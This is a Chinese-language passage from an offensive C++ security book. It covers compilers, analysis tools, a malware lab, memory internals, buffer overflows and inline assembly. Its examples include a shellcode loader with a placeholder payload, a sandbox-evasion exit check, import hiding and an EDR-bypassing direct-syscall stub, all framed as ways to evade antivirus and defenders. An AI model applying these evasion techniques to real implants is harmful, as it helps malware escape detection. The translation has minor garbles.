你可以在 `Ghidra` 中打开编译后的二进制文件，并查看函数列表中显示的内容。如果你看到清晰的函数名、未使用的导入，或者标记为 `.text`、`.rdata` 或 `.data` 且脱出的可疑节，这些都是可能被用来标记你二进制文件的痕迹。如果你正在构建一个必须规避静态和启发式分析的加载器或植入体，这一点尤为重要。`Ghidra` 将向你展示反向工程师在打开你的工具时看到的看到的画面。

为了快速概览二进制文件导入了哪些函数，你也可以使用 `PEStudio` 或 `Detect It Easy` (`DIE`)。这些工具将向你显示二进制文件的熵值、导入函数和节头部——这些对于在发送载荷之前快速检查你的载荷看起来有多像“恶意软件”非常有用。

这里有一个实际的例子：假设你正在编写一个反射型 DLL，将 shellcode 加载到内存中并执行。你用 `MinGW` 编译它，剥离符号，并使用 `PEStudio` 验证它只导入了 `VirtualAlloc`、`memcpy` 和 `CreateThread`。你在 `x64dbg` 中运行它，以确保 shellcode 执行时不崩溃。然后你将其加载到 `Ghidra` 中，确认函数名已混淆且控制流已平坦化（flattened）。这种工作流——从编译到运行时测试再到静态分析——是攻击性开发人员每天的工作。

目标不仅仅是构建出可以运行的代码。而是构建出能够生存的代码——在内存中、在分析之下、以及面对现代防御。每一个编译器标记、每一个函数导入和每一个字符串都至关重要。而这些工具——你的编译器、调试器、反汇编器——就是你确保你的载荷不仅运行，而且悄无声息地运行的方式。

## 2.3 使用 Visual Studio, MinGW 和 Clang

你选择的编译器不仅仅是一个技术决策——它塑造了你最终二进制文件的行为、大小、链接对象，以及它是否能与合法的系统活动融合。在攻击性安全中，这个选择具有真正的分量。你不是在为用户构建应用程序。你正在构建必须在进程内部而不被发现的二进制文件，直接与系统 API 交互，并且通常要在人类和机器分析的双重审查。

让我们从 `Visual Studio` 开始。如果你的目标是构建行为完全像 Windows 原生应用程序的工具，这是你的最佳选择。微软的编译器 `cl.exe` 是 Visual Studio 环境的一部分，与 Windows SDK 无缝集成。这意味着你的代码可以直接使用原生 API 而无需担心兼容性。你可以调用 `VirtualAlloc`、`GetProcAddress` 和 `CreateThread` 等函数，而无需任何额外设置——头文件和库已经连接到工具链中。

当你使用 `Visual Studio` 编译攻击性工具时，首先要做的的是从 `Debug` 切换到 `Release` 模式。调试构建会添加填充、元数据和符号信息，这些会立即被静态分析标记。

在项目属性内部，将运行时库设置为 `/MT` 而不是 `/MD`。这告诉编译器静态链接运行时，而不是依赖外部 DLL。它减少了依赖，并有助于你的二进制文件在更加固的环境中生存。

你可以通过重写入口点更进一步。默认情况下，Visual Studio 会添加 `mainCRTStartup`，它在调用你的 `main` 函数之前初始化运行时。但你并不总是需要它。如果你想从第一条指令开始控制执行，请使用 `/ENTRY:` 标记并定义自定义入口点。这让你对栈设置和执行行为有完全控制。当你构建加载器、shellcode 运行器或反射型 DLL 时，这种控制水平至关重要。

这里是 Visual Studio 中自定义入口点的简单示例：

```cpp
#include <windows.h>

int mainCRTStartup() {
    MessageBoxA(nullptr, "Payload Executed", "Black Hat C++", MB_OK);
    ExitProcess(0);
}
```

你可以通过 `/ENTRY:mainCRTStartup` 编译它以完全跳过 CRT 初始化。这是一种干净、快速启动执行的方法——特别是当你嵌入 shellcode 或试图减少噪音时。

现在让我们来看 `MinGW-w64`，这是一个基于 GCC 的 Windows 工具链。与 Visual Studio 不同，`MinGW` 默认不会引入许多依赖项，也不会链接到 Windows 运行时。这使其成为构建小型独立执行文件的极佳选择。如果你正在编写某种应该与原生二进制文件融合但携带负担很少的东西，`MinGW` 将为你派用场。

`MinGW` 的真正威力在于它与 Linux 结合时。你可以在 Kali 或 Ubuntu 上安装 `mingw-w64` 并直接从终端编译 Windows 二进制文件。这对于不想为了构建工具而专门使用 Windows 的红队基础设施非常有用。它在自动化载荷生成时也有帮助，因为你可以将 `MinGW` 集成到 shell 脚本、Makefile 甚至 CI 流水线中。




这是一个用 C++ 编写的小型加载器：

```cpp
#include <windows.h>

int main() {

unsigned char* payload = (unsigned char*)VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (!payload) return 1;

// 通过写入返回指令 (RET) 来模拟 shellcode

payload[0] = 0xC3;

((void(*)())payload)();

return 0;

}
```

你可以在 Linux 上使用以下命令编译它：

```
x86_64-w64-mingw32-g++ -o loader.exe loader.cpp -mwindows -static -s
```

`-mwindows` 标志可以防止控制台窗口出现，`-static` 将所有内容链接到单个文件中，而 `-s` 则剥离调试符号。你将得到一个没有运行时依赖的自包含二进制文件——非常适合红队行动。

`Clang` 是另一个你会发现非常有用的编译器，特别是当你正在进行跨平台开发或在意输出精度时。它能产生整洁的汇编代码，支持详细的诊断，并可以生成 LLVM IR 以供进一步分析或转换。该 IR 可以用于混淆控制流、插入垃圾指令，或者在将其转换回最终二进制文件之前添加加密逻辑。

假设你想分析指令层面的你的 shellcode 器看起来是什么样。`Clang` 可以编译你的代码并输出中间表示，甚至是原始汇编代码。然后你可以检查函数序言是如何结构的、参数是如何传递的，以及栈空间是如何分配的——所有这些都与检测相关。

以下是编译为 LLVM IR 的示例：

```
clang++ -S -emit-llvm payload.cpp -o payload.ll
```

然后你可以在将其编译回机器码之前，使用 LLVM passes 对 `payload.ll` 进行操纵。这是一种高级工作流，但它赋予了你以普通编译器不允许的方式来变异二进制文件的能力。

无论你是使用 Visual Studio、MinGW 还是 `Clang`，关键在于理解你的编译器在做什么——它链接了什么、创建了哪些节、它是如何设置执行的，以及它留下了哪些产物。你不仅仅是在编写代码。你正在塑造一个需要规避杀毒软件、融入环境并并在人工检查中生存二进制文件。你的编译器不仅仅是一个工具——它是你规避策略的一部分。

## 2.4 C++ 的静态分析与动态分析工具

当你使用 C++` 构建攻击性工具时，你不仅仅是为了功能编写代码——你正在编写需要规避检测、抵抗反向工程，并且表现得不像其真实身份的代码。为了有效地实现这一点，你需要像防御者那样分析你的二进制文件。这就是静态和动态分析工具大显身场的地方。这些工具让你在真实环境中运行它们之前，看到你的负载在杀毒软件、端点防护系统和反向工程师眼中看起来是什么样。

静态分析是在不执行二进制文件的情况下对其进行检查。你正在查看磁盘上的文件，检查其结构，并理解它仅仅通过存在就暴露了哪些线索。这包括分析导入函数、字符串、节头、熵值和编译时元数据。如果你编译的二进制文件调用了 `CreateRemoteThread`、分配了执行内存或包含了如 `"cmd.exe"` 的可读字符串，这些都会暴露出来。`PE-bear`、`Detect It Easy (DIE)` 和 `CFF Explorer` 等工具允许你快速、安全地检查这些细节。

例如，如果你用 C++ 编译了一个基础反向壳并在 `PE-bear` 中检查它，你可能会看到来自 `ws2_32.dll` 的导入，如 `connect`、`socket` 或 `WSAStartup`。这些是会立即引起注意的网络相关 API。如果你的二进制文件包含了 IP 地址或端口的可读字符串，那是另一个泄露。通过 `DIE` 这样的工具，你还可以检查每个节的熵。熵极高的节通常意味着加密或加壳——这可能会触发基于启发式的扫描器的怀疑。

这里可以尝试一下：使用 MinGW 构建一个负载，使用 `strip` 剥离符号，然后在 `PE-bear` 中打开该文件。除非你在运行时动态解析了它们，否则你仍然会看到导入项。这意味着你必须在代码中更进一步——使用 `GetProcAddress` 和 `LoadLibrary` 而不是静态链接。这样，导入项就不会出现在二进制文件的导入地址表 (IAT) 中。静态分析将无法判断你正在使用哪些 API，你的二进制文件也将更难被特征标记。

现在，动态分析将事情推向了高度。你在受监控环境中运行二进制文件并观察它实际在做什么。你正在寻找文件修改、注册表更改、派生进程、内存分配和网络活动。目标是理解你的工具在观察下的行为，特别是在运行了安全产品的环境中。

在 Windows 上，`Procmon`、`Process Hacker`、`Wireshark` 和 `API Monitor` 等工具是必需的。`Procmon` 提供了文件系统和注册表的实时视图。你可以过滤写入 `Run` 键（持久化）、临时文件的创建或对敏感路径的访问。如果你的负载向 `AppData` 写入文件或修改防火墙设置，`Procmon` 会捕获它。

`Process Hacker` 显示运行中的进程、句柄和线程。如果你将 shellcode 注入到另一个进程，你想查看目标进程是否生成了新线程、分配了多少内存以及是否请求了可疑的访问权限。

假设你正在测试一个使用内存分配内存的加载器，在虚拟机中运行该加载器，使其写入 shellcode 并创建线程。通过 `Procmon` 监控 `RegSetValue` 或 `WriteFile`（如果它是无文件的）。`API Monitor` 可以挂钩用户态 API 并跟踪哪些哪些函数被调用。它提供了比 `Process Hacker` 更细粒度的信息。例如，如果你的负载调用 `OpenProcess`、`WriteProcessMemory` 或 `CreateRemoteThread`，`API Monitor` 将捕获参数并显示涉及哪些进程 ID 和内存地址。

如果你在 Linux 上，你有不同的工具但方法相同。`strace` 显示二进制文件执行的所有系统调用。如果你看到 `open`、`write`、`connect` 或 `mmap`，你就知道二进制文件正在以可能触发检测的方式与系统交互。`lsof` 让你检查哪些文件和套接字被打开。`tcpdump` 或 `Wireshark` 可用于监控外部流量，特别是通过 HTTP、HTTPS 或自定义二进制协议通信的信标或 C2 植马。

当你需要自动化行为分析时，CAPEv2 或 Cuckoo 等箱环境也非常有用。这些系统在受监控的虚拟机中执行你的负载并生成完整的报告。你将获得涉及的文件、写入的注册表项、修改的内存节以及外部流量的总结。这让你全面了解负载的行为，有助于你设计更好的规避方案。

例如，如果你的植马在沙箱中运行并在 10 秒内被捕获，那可能是因为它执行得太快，一次性执行了太多可疑操作。你可以修改 C++ 代码以添加延迟，检查已知用户名、低内存或分析工具的存在等分析痕迹。如果这些条件成立，你可以尽早退出，避免让负载暴露完整扫描。

这是一个用 C++ 编写的非常基础的反分析检查：

```cpp
#include <windows.h>

bool IsSandbox() {
    MEMORYSTATUSEX memInfo = { sizeof(memInfo) };
    GlobalMemoryStatusEx(&memInfo);
    return memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024); // 小于 2GB
}

int main() {
    if (IsSandbox()) {
        ExitProcess(0);
    }

    // 主负载逻辑

}
```



如果系统内存小于 2GB，程序将静默退出 —— 这是恶意软件分析师使用的沙箱环境的常见特征。

将静态分析与动态分析相结合，是真正理解有效负载特征的方法。静态工具可以让你看到在磁盘上可以检测到什么。动态工具可以让你看到在运行时可以检测到什么。如果你在工作流中同时使用两者，就能在防御人员发现之前发现问题。

## 2.5 创建安全且隔离的恶意软件实验室

如果你正在构建攻击性工具，你将编写出杀毒引擎厌恶、端点检测系统（EDR）标记以及操作系统试图抑制的代码。这意味着在你的主机上测试这类代码是极其鲁莽的。只要一次错误 —— 一错误的双击 —— 你就会感染自己、毁掉网络，或触发导致全方位安全封锁的警报。这就是为什么创建一个安全、完全隔离的恶意软件实验室不仅是建议，更是强制性的。

你需要一个空间，可以在其中编写、编译、执行和观察类恶意软件的行为，而不会冒着损坏主系统的风险或向互联网泄露信号。目标是隔离一切——文件、执行过程、网络——并让你获得完全控制权，以便在受控环境中分析你的负载是如何运行的。

从虚拟化开始。使用 `VirtualBox`、`VMware Workstation` 或 `Hyper-V` 等工具。它们让你启动与宿主机完全分离的虚拟机操作系统。在这些虚拟机（VM）中，你可以模拟真实目标：`Windows 10 Pro`、`Windows Server 2019`，甚至是用于横移动或权限提升测试的精简 Linux 发行版。

在配置虚拟机时，分配至少 2 到 4 GB 的内存和 40 GB 的磁盘空间。确保禁用共享文件夹、剪贴板同步和拖放等集成功能。这些功能对于日常使用可能很方便，但它们在客机和主机之间引入了直接路径 —— 在运行不受信任的代码时，你绝对要避免这一点。

接下来，控制网络。你的恶意软件实验室绝不能无限制访问互联网。将虚拟机网络模式设置为 `Host-only`（主机模式）或 `Internal Network`（内部网络）。这在保持客机隔离的同时，仍允许它与同一虚拟交换机上的其他虚拟机通信。如果你由于 C2 模拟或 DNS 解析需要出站流量，请通过代理、`VPN` 或你可以监控并记录的本地 DNS 洞（sinkhole）进行路由。永远不要将你的恶意虚拟机直接连接到真实的路由器或生产网络。

现在我们聊聊工具。在实验室内部，你需要对进程行为、文件更改、注册表访问和网络连接完全可见。在 Windows 虚拟机上，安装 `Process Hacker`、`Procmon`、`Wireshark` 和 `PEStudio` 等工具。这些工具让你检查二进制文件行为的每一个方面 —— 从系统调用到进程注入，再到意外的子进程生成。如果你的加载器在 `explorer.exe` 内部创建了一个隐藏线程，你会看到它。如果它修改了注册表中的 `Run` 键以持久，你会实时捕获它。

在 Linux 虚拟机上，使用 `strace`、`lsof`、`tcpdump` 和 `gdb`。这些工具让你跟踪系统调用、打开的文件、捕捉网络活动并实时调试二进制文件。如果你的 `C++ implant` 使用 `mmap` 分配可执行内存或生成反向 shell，这些工具将帮助你看到精确的系统级行为。

快照是你最好的朋友。在安装工具前拍一张，在运行负载前拍一张，在安装你的二进制文件后再拍一张。如果发生任何故障，或你的系统陷入恶意状态，立即恢复到干净快照。这让你的实验室变得随用随弃 —— 这正是你运行不受信任代码时所需要的。

这里有一个小但重要的提示：始终使用 ISO 镜像或虚拟磁盘将二进制文件复制到虚拟机中，而不是网络共享或主机路径。将编译后的负载导出到 ISO 文件，在虚拟机中挂载它并在内部解压。这保持了你的主机完全隔绝，如果出了问题，任何东西都不会泄回。

为了模拟真实世界的目标，请创建多个虚拟机。一台安装了 `Office` 和 `Adobe Reader` 的 `Windows 10` 机器。一台作为文件服务器或域控制器的 `Windows Server VM`。一台运行 `SSH`、`cron jobs` 和基础服务的 `Linux VM`。然后用静态 IP 将它们相互连接。这种设置让你能够跨越真实的内部网络练习横向移动、持久化和渗透后攻击。

如果你计划测试持久化或重启行为，请确保你的虚拟机允许在关机后回滚到干净状态。某些负载会安装在启动时触发的自启动条目，这意味着当你的机器重启时，它们会静默执行。干净的快照确保你不会被未预先通知的负载感到意外。

现在，对于更高保真的监控，你可以使用 `CAPEv2` 或 `Cuckoo Sandbox` 等沙箱框架。这些工具提供对二进制文件的自动化分析，带有完整的行为日志、内存转储和网络捕捉。将它们设置在另一台机器或独立的虚拟机中，并将恶意软件指向它们。你将获得详细的报告，显示你的负载到底做了什么 —— 它接触了哪些文件，建立了哪些网络连接，与系统的哪些部分进行了交互。

最后，隔离你的存储。永远不要将编译后的恶意软件存储在主机硬盘。使用加密卷、虚拟磁盘或专用实验室分区。清晰地标记一切，这样你就不会意外将恶意二进制文件上传到 `GitHub` 或通过云同步传输它。你会惊讶于有多少人因为没有正确标记和分离它们而失去了对自己工具的控制。

创建恶意软件实验室不仅仅是为了运行恶意软件。它是为了学习负载如何运行、防御者如何响应，以及如何构建更好、更安静、更有效的攻击工具。当你对环境拥有完全控制权时，你可以安全地进行实验，研究自己的错误并在无风险的情况下进行改进。

# 第 3 章 – 黑客的低级 C++ 编程

当你编写攻击性工具时，深入得越深，获得的控制就越多。如果你想直接操作内存、在进程中执行 shellcode 或为了漏洞开发触发微妙崩溃，你必须理解 C++ 是如何处理内存的。这一章你的代码将不再像一个安全的应用程序，而是开始像武器一样行动。




```cpp
int number = 1337;

int* ptr = &number;

std::cout << "Value: " << *ptr << std::endl;

std::cout << "Address: " << ptr << std::endl;

*ptr = 8080;

std::cout << "Modified Value: " << number << std::endl;

return 0;
}
```

这里发生的事情简单但强大。你创建一个指针，将 `number` 的地址赋值它，然后通过指针修改该地址上的值。这是编写用于操纵内存或重定向执行的有效负载（payloads）的基础。这也是函数指针被覆盖、执行机器码（shellcode）以及检查栈帧的方式。

现在来看数组。`C++` 中的数组仅仅是连续的内存块。当你定义类似 `char buf[64]` 的内容时，你实际上创建了 64 字节相邻存储的内存。这意味着如果你获取了第一个字节的指针，就可以通过递增指针来遍历整个缓冲区。

```cpp
char buffer[5] = { 'A', 'B', 'C', 'D', '\0' };

char* p = buffer;

while (*p != '\0') {
    std::cout << *p << std::endl;
    p++;
}
```

这种技术在你解析内存结构、遍历机器码或构建在缓冲区上操作的负载时变得至关重要。你没有使用高层解析库 —— 你是在一个字节字节地遍历原始内存。

`C++` 中的直接内存访问还意味着你可以在任何地方分配内存，将其标记为可执行，向其写入，然后执行它。这是内存内机器码加载器（in-memory shellcode loaders）的基础。

这里有一个示例，展示了如何使用 Windows API 分配块内存，将负载拷贝其中并执行它：

```cpp
#include <windows.h>
#include <iostream>

unsigned char payload[] = {
    0xC3 // RET - 用于安全演示的占位符
};

int main() {
    void* exec = VirtualAlloc(nullptr, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        std::cerr << "Memory allocation failed." << std::endl;
        return 1;
    }
    memcpy(exec, payload, sizeof(payload));
    ((void(*)())exec)(); // 执行内存
    return 0;
}
```

你在这里做的是分配具有读/写/执行权限的内存，拷贝负载（在实际场景中可能是反向 shell 或自定义机器码），并通过将指针强制转换为函数并调用它来执行它。

这种模式出现在各种攻击技术中。反射型 DLL 加载器（Reflective DLL loaders）利用它在完全不接触磁盘的情况下映射并执行 DLL。恶意软件利用它在运行时解密负载并静默跳转到它们。无文件恶意软件（Fileless malware）依赖此存在于内存中，并通过从不向磁盘写入任何可检测的内容来规避杀毒软件。

数组和指针还允许你模拟或分析内存损坏。例如，向数组末尾之外写入内容模拟了经典的缓冲区溢出：

```cpp
char buffer[8];
strcpy(buffer, "AAAAAAAAAAAAAAAA"); // 覆盖相邻内存
```

这在漏洞利用中是危险且有意之为。你使用这种模式来识别内存何时被覆盖、控制流是如何被劫持的，以及是否可能执行任意代码。

需要记住的一点是，`C++` 给你的是控制权，而不是安全性。如果你写入你不应该写入的地址，可能会导致进程崩溃或引发漏洞。但这正是你在测试漏洞或模拟真实攻击时所需要的。

在 Linux 上，你可以使用 `mmap` 获取相同级别的控制权：

```cpp
#include <sys/mman.h>
#include <cstring>
#include <unistd.h>

int main() {
    unsigned char code[] = { 0xC3 }; // RET
    void* mem = mmap(nullptr, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(mem, code, sizeof(code));
    ((void(*)())mem)();
    return 0;
}
```

它的原理相同 —— 分配具有执行权限的内存，向其中写入字节，然后跳转到那里。

理解数组和指针与原始内存布局的关系，有助于你编写不依赖库的负载、解码并执行内存缓冲区的加载器，以及完全驻留在 RAM 中的植入程序（implants）。这是从高级编程转向严肃攻击性 C++ 工作所需的低级控制的第一步。

## 3.2 栈与堆内部原理

如果你正在用 `C++` 构建攻击性工具，你直接控制或滥用内存的能力取决于你对系统如何管理内存的理解程度。这从每个进程使用的两个核心内存区域开始：栈（stack）和堆（heap）。这些不仅仅是抽象概念。它们是程序内存布局的物理部分 —— 如果你知道它们在哪里以及如何运行，你就可以编写出更好的负载，发现真实的漏洞并精确地模拟漏洞利用。

栈是存放临时值的地方。每当你在函数中声明局部变量时，它就会进入栈。这还包括函数参数、返回地址、保存的寄存器和控制流元数据。栈是向下增长的 —— 意味着它从较高的内存地址开始，随着函数调用的增加向向较低的地址增长。每次函数调用都会创建一个栈帧（stack frame），这是一段持有该函数局部变量和上下文的内存。

这里有一个简单的示例来帮助你看到它：

```cpp
#include <iostream>

void checkStack() {
    int a = 10;
    int b = 20;
    std::cout << "&a: " << &a << std::endl;
    std::cout << "&b: " << &b << std::endl;
}

int main() {
    checkStack();
    return 0;
}
```

当你运行它时，你会发现 `b` 的地址比 `a` 低，显示栈是向下增长的。这在你试图理解溢出原理时非常重要 —— 因为当局部缓冲区溢出时，它会覆盖数据。让我们进一步推进一下：

```cpp
void overflow(char* input) {
    char buffer[16];
    strcpy(buffer, input);
}
```

你向小栈缓冲区拷贝数据。如果 `input` 大于 16 字节，它会覆盖像 EBP（基指针）和返回地址的数据。在漏洞应用程序中，这允许你将执行重定向到机器码。这就是经典栈溢出的基础。

栈是快速且自动的。它在函数调用时分配内存，在函数返回时释放。但它的大小是的。如果你在栈上分配了过多空间，会导致栈溢出 —— 不是漏洞利用的那种，而是程序崩溃。

现在，将注意力转向堆。堆是存放动态内存的地方。每当你使用 `new`、`malloc` 或类似的函数时，你都在请求系统从堆中提供内存。与栈不同，堆是手动管理的 —— 你显式地分配和释放它。它在内存中向上增长，与栈相反。它也灵活。你可以分配大块内存、调整大小并在函数调用之间持久数据。

尝试这个小代码段进行对比：

```cpp
#include <iostream>

void checkMemory() {
    int localVar = 42;
    int* heapVar = new int(99);
    std::cout << "栈变量地址: " << &localVar << std::endl;
    std::cout << "堆变量地址: " << heapVar << std::endl;
    delete heapVar;
}

int main() {
    checkMemory();
    return 0;
}
```

当你运行它时，你会发现堆变量距离栈很远 —— 这取决于操作系统和内存布局，通常位于较高的地址范围。当你编写为负载分配内存并希望避免留下栈轨迹的植入程序或加载器时，这种区别至关重要。

堆内存也可以被损坏，这就是变得危险的地方。在某些系统中，攻击者通过利用堆分配器的工作原理，修改元数据来欺骗分配器向任意内存位置写入数据。这就是堆利用（heap exploitation）。它比栈溢出复杂，但通常更强大 —— 特是在栈受到严格保护的现代系统上。




让我们模拟一下堆溢出在代码中是如何呈现的：

```cpp
#include <cstring>
#include <iostream>

int main() {
  char* buffer1 = new char[16];
  char* buffer2 = new char[16];
  strcpy(buffer1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAA");
  std::cout << "Buffer1: " << static_cast<void*>(buffer1) << std::endl;
  std::cout << "Buffer2: " << static_cast<void*>(buffer2) << std::endl;
  delete[] buffer1;
  delete[] buffer2;
  return 0;
}
```

这是一个粗糙的演示，但当 `buffer1` 溢出时，它会开始覆盖 `buffer2`。在真实的堆漏洞利用中，你针对的是控制内存释放方式的元数据（metadata），从而导致强大的攻击，如释放后使用（use-after-free）或任意写入。

在 Windows 上，你可能使用 `HeapAlloc` 分配堆内存并控制如 `HEAP_ZERO_MEMORY` 等标志。在 Linux 上，你会使用 `malloc`、`calloc` 或 `mmap`。无论如何，一旦你获得了堆内存的指针，你就完全控制了该段内存 —— 这对于存储编码载荷、运行时解密植入程序或分阶段多步攻击是理想的。

栈和堆都可以用于存储载荷，但它们在内存中的行为不同，且受操作系统的保护方式也不同。DEP（数据执行保护）通常会将这两个区域标记为不可执行，这就是为什么你必须使用 `VirtualAlloc` 或 `mprotect` 来显式请求可执行内存。

理解这种底层内存结构有助于你构建具有智能行为的载荷。例如，如果你需要在内存中存储一个加载器（loader）并动态向其传递函数指针，堆可以提供灵活性。但如果你想模拟崩溃并使用栈溢出来重定向执行流，那么栈就是你的目标。

在真实的恶意软件中，你经常会看到混合技术。利用栈漏洞获取初始控制权，然后在堆上分配内存以存放更大的载荷。壳代码（shellcode）被注入到堆内存中，并通过劫持返回地址或函数指针来执行。C++ 让你能够逐行实现并测试所有这些。

## 3.3 C++ 中的缓冲区溢出

当你的程序向内存缓冲区写入的数据超过其分配能容纳的内容，就会发生缓冲区溢出。在 C++ 中，这通常意味着越过了数组边界，通常是由于未检查的字符串操作或直接内存访问导致的。这不仅仅是一个 bug —— 它是一扇门。这扇门可以允许攻击者控制执行流、注入壳代码或导致应用程序崩溃，取决于溢出的发生方式和位置。

栈是缓冲区溢出最常见的地方，特别是在旧的或有漏洞的代码库中。让我们来看一个基础但危险的例子：

```cpp
#include <iostream>
#include <cstring>

void vulnerableFunction(const char* input) {
  char buffer[16];
  strcpy(buffer, input);
  std::cout << "Buffer: " << buffer << std::endl;
}

int main() {
  const char* longInput = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  vulnerableFunction(longInput);
  return 0;
}
```

这段代码可以正常编译，并且取决于你的环境，最初运行可能甚至可能都不会崩溃。但它正在做一件危险的事情：它接收未检查的输入，并使用 `strcpy` 将其写入一个小的 16 字节缓冲区中，而 `strcpy` 是不检查长度。如果 `input` 长于 16 字节，多部分将开始覆盖缓冲区之外的内存。

在栈上，`buffer` 之外的内容可能是保存的寄存器或返回地址。如果攻击者可以控制进入这些区域的内容，他们就可以劫持程序的控制权 —— 修改返回地址以跳转到壳代码，或者设置返回面向编程（ROP）链。

以下是其危险之处所在：编译器和运行时不会阻止你。在 C++ 中，原始数组和指针没有内置的边界检查。你必须自己强制执行这一点。这就是为什么老式的攻击程序经常针对 C 和 C++ 程序 —— 这种语言赋予了你力量，但如果你不小心，它也会给你自吊的绳索。

要理解这在实践中如何工作，请编译上述代码并使用 `GDB`（Linux 上）或 `x64dbg`（Windows 上）等调试器检查栈。在 `strcpy` 调用之后设置断点并检查栈内容。你会看到输入是如何溢出到缓冲区之外的内存的。

现在，让我们来看一个模拟受控攻击条件的版本：

```cpp
#include <iostream>
#include <cstring>

void triggerOverflow() {
  char buffer[32];
  std::cout << "Enter input: ";
  std::cin >> buffer;
  std::cout << "You entered: " << buffer << std::endl;
}

int main() {
  triggerOverflow();
  return 0;
}
```

如果你在运行时向此输入超过 32 个字符，你将覆盖栈的一部分。如果你是针对一个有漏洞的二进制文件执行此操作，你将构造输入，将返回地址覆盖为壳代码缓冲区的地址或内存中实用的 getget（gadget）。

在现代系统中，有几种保护措施尝试阻止这一点：栈金丝符（stack canaries）、不可执行栈（DEP）、地址空间布局随机化（ASLR）和控制流防护（CFG）。但在正确的条件下，这些保护措施可以被绕过 —— 特别是程序泄露内存地址、禁用了保护或运行在受限或旧的环境中时。

让我们转换话题谈论堆。虽然栈溢出更常见，但堆溢出也是一种严重的向量 —— 特别是使用 `new` 或 `malloc` 的堆缓冲区。堆溢出的危险在于内存是如何分配和释放的，导致分配器行为异常，或覆盖相邻的对象。

这里是 C++ 中简化的堆溢出：

```cpp
#include <iostream>
#include <cstring>

int main() {
  char* buffer1 = new char[16];
  char* buffer2 = new char[16];
  strcpy(buffer1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); // 溢达到 buffer2
  std::cout << "Buffer2 (possibly corrupted): " << buffer2 << std::endl;
  delete[] buffer1;
  delete[] buffer2;
  return 0;
}
```

如果内存布局将 `buffer2` 放置在 `buffer1` 之后，`buffer1` 的溢出可能会改变 `buffer2` 的内容。如果 `buffer2` 存储函数指针、虚表指针或控制结构，就可以被利用 —— 你将其覆盖为攻击者控制的内容并劫持行为。

在攻击性开发中，缓冲区溢出经常用于触发代码执行 —— 无论是直接（跳转到壳代码）还是间接（通过 ROP 链现有指令）。在红队渗透和漏洞研究中，你的工作是在安全环境中模拟这些情况，分析溢出的行为，并构建工具来测试它们。

这里有一点很重要：现代 C++ 开发倾向于使用 `std::string`、`std::vector` 类似的容器，这些容器会自动处理边界。但在攻击性 C++ 中，你经常处理原始内存和故意不安全的模式，因为那是真实的攻击程序和恶意软件所做的。所以你紧贴底层工作，就像上面的示例一样。

一种视觉化展示覆盖过程的方法是在溢出前后打印内存地址和值：

```cpp
#include <iostream>
#include <cstring>

void inspect() {
  char buffer1[8];
  char buffer2[8] = "BEEP";
  std::cout << "Before overflow: " << buffer2 << std::endl;
  strcpy(buffer1, "AAAAAAAAAAAAAAAAAAAA");
  std::cout << "After overflow: " << buffer2 << std::endl;
}

int main() {
  inspect();
  return 0;
}
```

这可能会用 As 覆盖 `buffer2`，显示了看似不相关的变量如何通过溢出另一个变量被改变。这就是内存损坏的核心：写入你不应该到达的地方。

C++ 中的缓冲区溢出不仅仅是编程错误。它们是机会 —— 测试防御、模拟攻击以及研究代码与内存交互的界限。作为一名攻击性开发者，你利用这些概念来理解载荷如何利用弱点，以及如何构造你的代码在与漏洞目标交互时以特定的、受控的方式运行。

## 3.4 内联汇编与寄存器操作





在攻击性 C++ 编程中，总会有一个高级抽象不再够用的时刻。无论你是在编写系统调用（syscalls）、构建自定义 shellcode 加载器，还是通过避免 API 调用来规避检测，你都需要对处理器寄存器和指令进行精确控制。这就是内联汇编和寄存器操作派用用场。

C++ 是少数允许将原始汇编指令直接混合到代码中的高级语言之一。在使用微软 MSVC 编译器的 32 位系统上，你可以使用 `__asm` 写内联汇编。在 64 位系统上，你需要使用外部汇编文件或编译器内置函数（intrinsics），因为 MSVC 不支持 64 位下的内联汇编。GCC 和 Clang 通过 `asm` 或 `__asm__` 关键字提供扩展内联汇编。

让我们从一个使用 MSVC 的 32 位 Windows 简单示例开始：

```cpp
#include <iostream>

int main() {
    int value = 5;
    __asm {
        mov eax, value
        add eax, 3
        mov value, eax
    }
    std::cout << "Modified value: " << value << std::endl;
    return 0;
}
```

这段代码将变量 `value` 加载到 `EAX` 寄存器，加上 `3`，然后写回。你正在 C++ 程序内部直接操纵 CPU 寄存器。对于恶意软件开发人员和红队人员来说，这是创建多态或混淆负载、钩子程序（hooking routines），或通过使用编译器通常不产生的指令来规避控制流完整性检查的基础。

当你目标是 64 位系统时，你需要采取不同的方法，因为 MSVC 禁用了 x64 的内联汇编。你可以使用单独的汇编文件将其链接到二进制文件中，或者使用编译器内置函数。以下是使用内置函数读写特殊寄存器的方法：

```cpp
#include <intrin.h>
#include <iostream>

int main() {
    unsigned __int64 rsp = __readrsp();
    std::cout << "Current RSP (Stack Pointer): " << std::hex << rsp << std::endl;
    return 0;
}
```

像 `__readrsp`、`__readeflags` 和 `__readcr0` 这样的函数让你在不需要内联汇编的情况下洞察 CPU 状态。它们在想要读取当前执行上下文或操纵控制寄存器以实现隐蔽行为的场景下特别有用。

在 Linux 上，你拥有更大的灵活性。使用 GCC 或 Clang，你可以使用 `asm` 关键字编写内联汇编。这是一个将值移动到寄存器并将其获取的示例示例：

```cpp
#include <iostream>

int main() {
    int result;
    asm("movl $42, %0" : "=r"(result));
    std::cout << "Result: " << result << std::endl;
    return 0;
}
```

这是扩展内联汇编，它允许你通过约束条件（constraints）将寄存器值与 C++ 变量集成。它在漏洞开发中被广泛使用，特别是当你想避免调用标准库函数，或者在编写系统调用存根（syscall stubs）时。

让我们更进一步。假设你想直接调用系统调用而不使用 Windows API。一个经典的例子是 `NtAllocateVirtualMemory`。你可以用汇编编写自己的系统调用存根并在 C++ 中执行它。恶意软件作者这样做是为了避免触发 EDR（终端检测与响应解决方案）放置的用户态钩子。其原理是完全跳过 Windows API，直接使用 `syscall` 跳入内核。

在 64 位 Windows 上，一个典型的系统调用存根在汇编中可能像这样：

```assembly
mov r10, rcx
mov eax, syscall_number
syscall
ret
```

